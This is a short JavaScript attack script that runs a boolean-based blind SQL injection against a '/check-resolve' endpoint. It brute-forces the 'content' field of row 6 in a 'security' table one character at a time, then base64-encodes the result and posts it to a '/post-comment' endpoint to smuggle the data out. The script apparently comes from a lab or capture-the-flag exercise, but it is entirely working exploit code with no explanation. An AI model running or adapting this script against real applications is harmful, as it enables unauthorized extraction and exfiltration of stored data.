// Base information
const url = '/check-resolve';
const postCommentUrl = '/post-comment'; // URL to post the comment
const content_length = 44; // Adjust as needed
const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()*+,-./:;<=>?@[]^_{|}~"; 
let discovered_content = '';

// Function to check each character
function checkCharacter(index, char) {
  const payload = `id=1 and (SELECT hex(substr(content,${index},1)) FROM security WHERE id = 6 limit 1) = hex('${char}')`;
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: payload
  })
  .then(response => response.text())
  .then(text => {
    return text.includes("Done"); // Assuming "Done" indicates a match
  });
}

// Function to post the discovered content
function postDiscoveredContent(discovered_content) {
  const postData = new URLSearchParams({
    comment2: btoa(discovered_content), // Base64 encode the content
  });

  return fetch(postCommentUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: postData
  })
  .then(response => {
    if (response.ok) {
      console.log('Content successfully posted.');
    } else {
      console.error('Failed to post content.');
    }
  });
}

// Sequentially discover each character of the content
async function discoverContent() {
  for (let index = 1; index <= content_length; index++) {
    let found_char = false;
    for (let i = 0; i < characters.length; i++) {
      const char = characters.charAt(i);
      const match = await checkCharacter(index, char);
      if (match) {
        discovered_content += char;
        console.log(`Found char at position ${index}: ${char}`);
        found_char = true;
        break; // Proceed to the next character position
      }
    }
    if (!found_char) {
      console.log(`Character at position ${index} not found, assuming end of content.`);
      break; // Assume end of content if no character is found for the current position
    }
  }
  console.log(`Discovered content: ${discovered_content}`);
  // Post the discovered content after all characters have been checked
  postDiscoveredContent(discovered_content);
}

// Start the discovery process
discoverContent();
